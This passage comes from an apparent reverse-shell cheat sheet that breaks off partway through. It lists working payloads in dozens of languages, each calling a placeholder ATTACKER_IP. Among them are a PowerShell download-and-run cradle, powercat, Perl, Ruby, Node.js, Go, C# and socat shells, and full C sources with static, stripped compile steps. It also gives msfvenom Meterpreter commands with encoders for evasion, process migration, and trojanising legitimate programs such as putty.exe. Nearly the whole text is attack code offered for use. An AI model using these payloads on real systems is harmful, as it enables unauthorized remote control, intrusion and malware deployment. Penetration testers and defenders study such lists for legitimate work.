IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
```

```powershell [Powercat Reverse Shell]
powercat -c ATTACKER_IP -p PORT -e cmd.exe
```

```powershell [Powercat Reverse Shell — PowerShell]
powercat -c ATTACKER_IP -p PORT -ep
```

```powershell [Powercat SSL Reverse Shell]
powercat -c ATTACKER_IP -p PORT -e cmd.exe -ssl
```

```powershell [Powercat DNS Reverse Shell]
powercat -c ATTACKER_IP -p PORT -e cmd.exe -dns attacker-domain.com
```

```powershell [Powercat Encoded Payload (Generate)]
powercat -c ATTACKER_IP -p PORT -e cmd.exe -ge > encoded_payload.ps1
```

---

## Perl

```perl [Perl Reverse Shell #1 — Socket]
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl [Perl Reverse Shell #2 — bash]
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

```perl [Perl Reverse Shell #3 — IO::Socket]
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl [Perl Reverse Shell #4 — no fork]
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl [Perl Reverse Shell #5 — backticks]
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));while(<S>){$_=`$_`;print S}'
```

```perl [Perl Windows Reverse Shell]
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe");};'
```

---

## Ruby

```ruby [Ruby Reverse Shell #1 — exec]
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```ruby [Ruby Reverse Shell #2 — bash]
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

```ruby [Ruby Reverse Shell #3 — fork]
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP",PORT);loop{c.gets.chomp!;(exit! if $_=="exit");IO.popen($_,"r"){|io|c.print io.read}rescue c.print "error\n"}'
```

```ruby [Ruby Reverse Shell #4 — system]
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP",PORT);while(cmd=c.gets);system(cmd);end'
```

```ruby [Ruby Reverse Shell #5 — backticks]
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP",PORT);while(cmd=c.gets);c.puts `#{cmd}`;end'
```

```ruby [Ruby Reverse Shell #6 — PTY]
ruby -rsocket -e 'require "pty";s=TCPSocket.open("ATTACKER_IP",PORT);PTY.spawn("/bin/bash"){|r,w,pid|Thread.new{while(l=r.readpartial(1024));s.write(l);end};while(d=s.readpartial(1024));w.write(d);end}'
```

```ruby [Ruby Windows Reverse Shell]
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP",PORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java

```java [Java Runtime.exec #1]
Runtime.getRuntime().exec("bash -c {echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|{bash,-i}");
```

```java [Java Runtime.exec #2 — String array]
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"});
```

```java [Java ProcessBuilder]
new ProcessBuilder(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"}).start();
```

```java [Java Full Reverse Shell]
import java.io.*;
import java.net.*;

public class RevShell {
    public static void main(String[] args) throws Exception {
        String host = "ATTACKER_IP";
        int port = PORT;
        String cmd = "/bin/bash";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush(); po.flush();
            Thread.sleep(50);
            try { p.exitValue(); break; } catch (Exception e) {}
        }
        p.destroy(); s.close();
    }
}
```

```groovy [Groovy Reverse Shell (Jenkins)]
String host = "ATTACKER_IP";
int port = PORT;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy(); s.close();
```

```groovy [Groovy Short Reverse Shell]
"bash -c {echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|{bash,-i}".execute()
```

---

## Node.js / JavaScript

```javascript [Node.js Reverse Shell #1 — child_process]
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')
```

```javascript [Node.js Reverse Shell #2 — spawn with pipe]
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

```javascript [Node.js Reverse Shell #3 — bash]
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",["-i"]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

```javascript [Node.js Reverse Shell #4 — exec loop]
(function(){var net=require("net"),cp=require("child_process");var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.on("data",function(data){var cmd=cp.exec(data.toString());cmd.stdout.pipe(client);cmd.stderr.pipe(client);});});return /a/;})();
```

```javascript [Node.js Reverse Shell #5 — execSync]
require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
```

```javascript [Node.js Windows Reverse Shell]
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("cmd.exe",[]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

```javascript [Node.js Windows PowerShell Reverse Shell]
(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("powershell.exe",["-nop"]);var client=new net.Socket();client.connect(PORT,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

```javascript [Node.js TLS Encrypted Reverse Shell]
(function(){var tls=require("tls"),cp=require("child_process"),sh=cp.spawn("/bin/bash",["-i"]);var client=tls.connect(PORT,"ATTACKER_IP",{rejectUnauthorized:false},function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
```

---

## Go

```go [Go Reverse Shell — Full Source]
package main

import (
    "net"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "ATTACKER_IP:PORT")
    cmd := exec.Command("/bin/sh", "-i")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```

```go [Go Reverse Shell — bash]
package main
import ("net";"os/exec")
func main() {
    c, _ := net.Dial("tcp", "ATTACKER_IP:PORT")
    cmd := exec.Command("/bin/bash", "-i")
    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
    cmd.Run()
}
```

```go [Go Windows Reverse Shell]
package main
import ("net";"os/exec")
func main() {
    c, _ := net.Dial("tcp", "ATTACKER_IP:PORT")
    cmd := exec.Command("cmd.exe")
    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
    cmd.Run()
}
```

```go [Go TLS Encrypted Reverse Shell]
package main
import ("crypto/tls";"os/exec")
func main() {
    conf := &tls.Config{InsecureSkipVerify: true}
    c, _ := tls.Dial("tcp", "ATTACKER_IP:PORT", conf)
    cmd := exec.Command("/bin/bash", "-i")
    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
    cmd.Run()
}
```

```bash [Go One-Liner (compile on target)]
echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh","-i");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go
```

---

## Rust

```rust [Rust Reverse Shell]
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("ATTACKER_IP:PORT").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

---

## C#

```csharp [C# Reverse Shell — Full Source]
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class RevShell {
    static void Main() {
        using (TcpClient client = new TcpClient("ATTACKER_IP", PORT)) {
            using (NetworkStream stream = client.GetStream()) {
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
                
                while (true) {
                    writer.Write("PS> ");
                    string cmd = reader.ReadLine();
                    if (cmd == null || cmd.ToLower() == "exit") break;
                    
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + cmd;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.Start();
                    
                    writer.Write(p.StandardOutput.ReadToEnd());
                    writer.Write(p.StandardError.ReadToEnd());
                    p.WaitForExit();
                }
            }
        }
    }
}
```

```csharp [C# Reverse Shell — Process redirect]
using System;
using System.Net.Sockets;
using System.Diagnostics;

class R {
    static void Main() {
        TcpClient c = new TcpClient("ATTACKER_IP", PORT);
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        
        var s = c.GetStream();
        var sr = new System.IO.StreamReader(s);
        var sw = new System.IO.StreamWriter(s) { AutoFlush = true };
        
        System.Threading.Tasks.Task.Run(() => { while (true) { sw.Write((char)p.StandardOutput.Read()); } });
        System.Threading.Tasks.Task.Run(() => { while (true) { sw.Write((char)p.StandardError.Read()); } });
        
        while (true) {
            var cmd = sr.ReadLine();
            if (cmd == null) break;
            p.StandardInput.WriteLine(cmd);
        }
    }
}
```

---

## Lua

```lua [Lua Reverse Shell #1]
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

```lua [Lua Reverse Shell #2]
lua5.1 -e 'local host, port = "ATTACKER_IP", PORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

---

## AWK

```bash [AWK Reverse Shell #1]
awk 'BEGIN{s="/inet/tcp/0/ATTACKER_IP/PORT";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}while(c != "exit")close(s)}}'
```

```bash [AWK Reverse Shell #2 — gawk]
gawk 'BEGIN{s="/inet/tcp/0/ATTACKER_IP/PORT";while(1){do{printf "> " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}while(c != "exit")close(s)}}'
```

---

## Socat

```bash [Socat Reverse Shell #1 — basic]
socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash
```

```bash [Socat Reverse Shell #2 — full TTY]
socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

```bash [Socat Reverse Shell #3 — sh]
socat TCP:ATTACKER_IP:PORT EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

```bash [Socat Reverse Shell #4 — SSL encrypted]
socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

```bash [Socat Reverse Shell #5 — SSL with cert verification]
socat OPENSSL:ATTACKER_IP:PORT,cert=client.pem,cafile=server.crt EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

```bash [Socat Reverse Shell #6 — fork (persistent)]
socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane,fork
```

```bash [Socat Reverse Shell #7 — UDP]
socat UDP:ATTACKER_IP:PORT EXEC:/bin/bash
```

```bash [Socat Windows Reverse Shell]
socat TCP:ATTACKER_IP:PORT EXEC:cmd.exe,pty,stderr
```

---

## Telnet

```bash [Telnet Reverse Shell #1 — mkfifo]
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | /bin/sh 1>$TF
```

```bash [Telnet Reverse Shell #2 — two connections]
telnet ATTACKER_IP PORT | /bin/bash | telnet ATTACKER_IP PORT+1
```

```bash [Telnet Reverse Shell #3 — named pipe]
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet ATTACKER_IP PORT > /tmp/f
```

```bash [Telnet Reverse Shell #4 — mknod]
mknod /tmp/bp p && telnet ATTACKER_IP PORT 0</tmp/bp | /bin/sh 1>/tmp/bp 2>&1
```

---

## OpenSSL

```bash [OpenSSL Reverse Shell #1]
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s
```

```bash [OpenSSL Reverse Shell #2 — bash]
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s
```

```bash [OpenSSL Reverse Shell #3 — no verify]
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect ATTACKER_IP:PORT > /tmp/s 2>/dev/null; rm /tmp/s
```

::note
**OpenSSL listener required on attacker side:**

```bash [Attacker — OpenSSL Listener]
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port PORT
```
::

---

## Xterm

```bash [Xterm Reverse Shell]
xterm -display ATTACKER_IP:1
```

::note
Attacker must run an X server:

```bash [Attacker — Start X Server]
Xnest :1
# or
xhost +TARGET_IP
```
::

---

## Miscellaneous Languages

### R

```r [R Reverse Shell]
system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
```

### Dart

```dart [Dart Reverse Shell]
import 'dart:io';
void main() {
  Socket.connect("ATTACKER_IP", PORT).then((socket) {
    Process.start('/bin/sh', ['-i'], environment: Platform.environment)
      .then((process) {
        socket.pipe(process.stdin);
        process.stdout.pipe(socket);
        process.stderr.pipe(socket);
      });
  });
}
```

### Elixir

```elixir [Elixir Reverse Shell]
:os.cmd('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')
```

### Haskell

```haskell [Haskell Reverse Shell]
import Network.Socket
import System.Process
import System.IO

main = do
    s <- socket AF_INET Stream 0
    connect s (SockAddrInet PORT (tupleToHostAddress (ATTACKER_IP_TUPLE)))
    h <- socketToHandle s ReadWriteMode
    hSetBuffering h NoBuffering
    (_, _, _, p) <- createProcess (proc "/bin/sh" ["-i"]) { std_in = UseHandle h, std_out = UseHandle h, std_err = UseHandle h }
    waitForProcess p
```

### Nim

```nim [Nim Reverse Shell]
import net, osproc
var s = newSocket()
s.connect("ATTACKER_IP", Port(PORT))
while true:
  let cmd = s.recvLine()
  let output = execProcess(cmd)
  s.send(output)
```

### Crystal

```crystal [Crystal Reverse Shell]
require "socket"
s = TCPSocket.new("ATTACKER_IP", PORT)
Process.new("/bin/sh", ["-i"], input: s, output: s, error: s)
```

### Erlang

```erlang [Erlang Reverse Shell]
os:cmd("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'").
```

### Scala

```scala [Scala Reverse Shell]
import scala.sys.process._
"bash -c {echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|{bash,-i}".!
```

### Kotlin

```kotlin [Kotlin Reverse Shell]
Runtime.getRuntime().exec(arrayOf("/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"))
```

### Swift

```swift [Swift Reverse Shell]
import Foundation
let task = Process()
task.executableURL = URL(fileURLWithPath: "/bin/bash")
task.arguments = ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"]
try task.run()
task.waitUntilExit()
```

### V Lang

```v [V Reverse Shell]
import os
os.execute('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')
```

### Zig

```zig [Zig Reverse Shell (via system call)]
const std = @import("std");
pub fn main() !void {
    _ = try std.ChildProcess.init(.{
        .argv = &[_][]const u8{ "/bin/sh", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" },
    }, std.heap.page_allocator).spawnAndWait();
}
```

---

## C / C++

### Linux C Reverse Shell

```c [C Reverse Shell — Linux]
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");
    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

```c [C Reverse Shell — Linux with fork]
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    if (fork() == 0) {
        int sock;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");
        sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
        execve("/bin/bash", (char *[]){"/bin/bash", "-i", NULL}, NULL);
    }
    return 0;
}
```

```c [C Reverse Shell — Reconnecting]
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    while (1) {
        int sock;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
            execve("/bin/sh", NULL, NULL);
        }
        close(sock);
        sleep(30);
    }
    return 0;
}
```

### Windows C Reverse Shell

```c [C Reverse Shell — Windows]
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = inet_addr("ATTACKER_IP");
    WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    WSACleanup();
    return 0;
}
```

### Compile Commands

```bash [Linux — Standard Compile]
gcc reverse.c -o reverse
```

```bash [Linux — Static Compile (No Dependencies)]
gcc reverse.c -o reverse -static
```

```bash [Linux — 32-bit Compile]
gcc -m32 reverse.c -o reverse32
```

```bash [Linux — Strip Symbols]
gcc reverse.c -o reverse -s -static
strip reverse
```

```bash [Windows — Cross-Compile from Linux]
x86_64-w64-mingw32-gcc reverse_win.c -o reverse.exe -lws2_32
```

```bash [Windows — 32-bit Cross-Compile]
i686-w64-mingw32-gcc reverse_win.c -o reverse32.exe -lws2_32
```

---

## msfvenom Payloads

### Windows Reverse Shell Payloads

::code-group
  ```bash [Windows x64 — Meterpreter Staged TCP]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
  ```

  ```bash [Windows x64 — Meterpreter Stageless TCP]
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
  ```

  ```bash [Windows x64 — Raw Shell TCP]
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
  ```

  ```bash [Windows x64 — Meterpreter Staged HTTP]
  msfvenom -p windows/x64/meterpreter/reverse_http LHOST=ATTACKER_IP LPORT=80 -f exe -o shell_http.exe
  ```

  ```bash [Windows x64 — Meterpreter Staged HTTPS]
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o shell_https.exe
  ```

  ```bash [Windows x64 — Meterpreter Stageless HTTPS]
  msfvenom -p windows/x64/meterpreter_reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o shell_https_sl.exe
  ```

  ```bash [Windows x64 — Meterpreter DNS]
  msfvenom -p windows/x64/meterpreter/reverse_dns LHOST=ATTACKER_IP LPORT=53 -f exe -o shell_dns.exe
  ```

  ```bash [Windows x64 — Named Pipe]
  msfvenom -p windows/x64/meterpreter/reverse_named_pipe PIPEHOST=ATTACKER_IP PIPENAME=pipe -f exe -o shell_pipe.exe
  ```

  ```bash [Windows x86 — Meterpreter Staged TCP]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell32.exe
  ```

  ```bash [Windows x86 — Meterpreter Stageless TCP]
  msfvenom -p windows/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell32_sl.exe
  ```

  ```bash [Windows x86 — Raw Shell TCP]
  msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell32_raw.exe
  ```

  ```bash [Windows x86 — Meterpreter HTTPS]
  msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o shell32_https.exe
  ```
::

### Windows Format Variants

::code-group
  ```bash [DLL]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o payload.dll
  ```

  ```bash [MSI]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o payload.msi
  ```

  ```bash [HTA]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f hta-psh -o payload.hta
  ```

  ```bash [VBA Macro]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f vba -o macro.vba
  ```

  ```bash [VBS]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f vbs -o payload.vbs
  ```

  ```bash [PowerShell Command]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f psh-cmd -o payload.bat
  ```

  ```bash [PowerShell Reflection]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f psh-reflection -o payload.ps1
  ```

  ```bash [EXE-Service (For SCM)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o svc_payload.exe
  ```

  ```bash [SCF File (Icon redirect for hash capture)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > payload.scf
  ```
::

### Windows Encoded Payloads

::code-group
  ```bash [Shikata Ga Nai x5]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
  ```

  ```bash [XOR + Shikata Ga Nai]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/shikata_ga_nai -i 3 -f raw | msfvenom -e x86/xor -i 2 -a x86 --platform windows -f exe -o double.exe
  ```

  ```bash [Alpha Mixed (Alphanumeric)]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/alpha_mixed -f exe -o alpha.exe
  ```

  ```bash [Bad Characters Removed]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d\x20' -f exe -o nobadchars.exe
  ```
::

### Windows Template Injection

::code-group
  ```bash [Inject into Legitimate EXE]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -x /path/to/putty.exe -k -f exe -o trojan_putty.exe
  ```

  ```bash [Inject into Legitimate EXE (x86)]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -x /path/to/notepad.exe -k -f exe -o trojan_notepad.exe
  ```
::

### Windows AutoMigrate Payloads

::code-group
  ```bash [Auto-Migrate to explorer.exe]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o automigrate.exe
  ```

  ```bash [Auto-Migrate to svchost.exe]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o automigrate_svc.exe
  ```

  ```bash [Auto-Migrate to notepad.exe]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT PrependMigrate=true PrependMigrateProc=notepad.exe -f exe -o automigrate_np.exe
  ```
::

### Linux Reverse Shell Payloads

::code-group
  ```bash [Linux x64 — Meterpreter Staged TCP]
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf
  ```

  ```bash [Linux x64 — Meterpreter Stageless TCP]
  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_sl.elf
  ```

  ```bash [Linux x64 — Raw Shell TCP]
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_raw.elf
  ```

  ```bash [Linux x64 — Meterpreter HTTP]
  msfvenom -p linux/x64/meterpreter/reverse_http LHOST=ATTACKER_IP LPORT=80 -f elf -o shell_http.elf
  ```

  ```bash [Linux x64 — Meterpreter HTTPS]
  msfvenom -p linux/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f elf -o shell_https.elf
  ```

  ```bash [Linux x86 — Meterpreter Staged TCP]
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell32.elf
  ```

  ```bash [Linux x86 — Raw Shell TCP]
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell32_raw.elf
  ```

  ```bash [Linux — Shared Object (.so)]
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf-so -o payload.so
  ```

  ```bash [Linux — Python payload]
  msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -o shell.py
  ```

  ```bash [Linux — Python HTTPS]
  msfvenom -p python/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -o shell_https.py
  ```
::

### Linux ARM Payloads (Raspberry Pi / IoT)

::code-group
  ```bash [Linux ARM — Meterpreter]
